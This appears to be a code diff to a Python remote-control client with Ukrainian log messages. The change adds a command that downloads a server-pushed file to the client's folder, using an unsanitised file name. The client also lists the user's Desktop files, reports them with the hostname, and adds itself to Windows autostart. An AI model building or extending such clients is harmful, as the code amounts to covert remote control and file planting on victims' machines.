@@ -33,7 +33,6 @@ class Client:
 
     def _execute_cmd(self, message: dict):
         cmd = message.get("cmd")
-
         if cmd == "wait":
             time.sleep(message.get("sec", config.WAIT_SEC))
         elif cmd == "shutdown":
@@ -47,6 +46,14 @@ class Client:
         elif cmd == "desktop":
             files = self._get_desktop()
             self._send_response({"hostname": socket.gethostname(), "files": files})
+        elif cmd == "file_to_send":
+            file_name = message.get("file_name", "")
+            file_size = message.get("file_size", 0)
+
+            if file_name and file_size:
+                self._receive_file(file_name, file_size)
+            else:
+                print("[Клієнт] Некоректні метадані файлу")
 
     def _get_desktop(self) -> list[str]:
         desktop = os.path.expanduser("~/Desktop")
@@ -81,6 +88,26 @@ class Client:
         with winreg.OpenKey(winreg.HKEY_CURRENT_USER, AUTOSTART_KEY, 0, winreg.KEY_SET_VALUE) as key:
             winreg.SetValueEx(key, AUTOSTART_NAME, 0, winreg.REG_SZ, path)
             print(f"[Клієнт] Додано в автозавантаження")
+
+    def _receive_file(self, file_name: str, file_size: int):
+        client_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
+        save_path = os.path.join(client_dir, file_name)
+
+        try:
+            with socket.create_connection((config.SERVER_HOST, config.FILE_PORT), timeout=10) as conn:
+                received = 0
+                with open(save_path, "wb") as file:
+                    while received < file_size:
+                        chunk = conn.recv(min(65536, file_size - received))
+                        if not chunk:
+                            break
+
+                        file.write(chunk)
+                        received += len(chunk)
+
+            print(f"[Клієнт] Файл збережено: {save_path}")
+        except Exception as e:
+            print(f"[Клієнт] Помилка прийому файлу: {e}")
 
 
 if __name__ == "__main__":
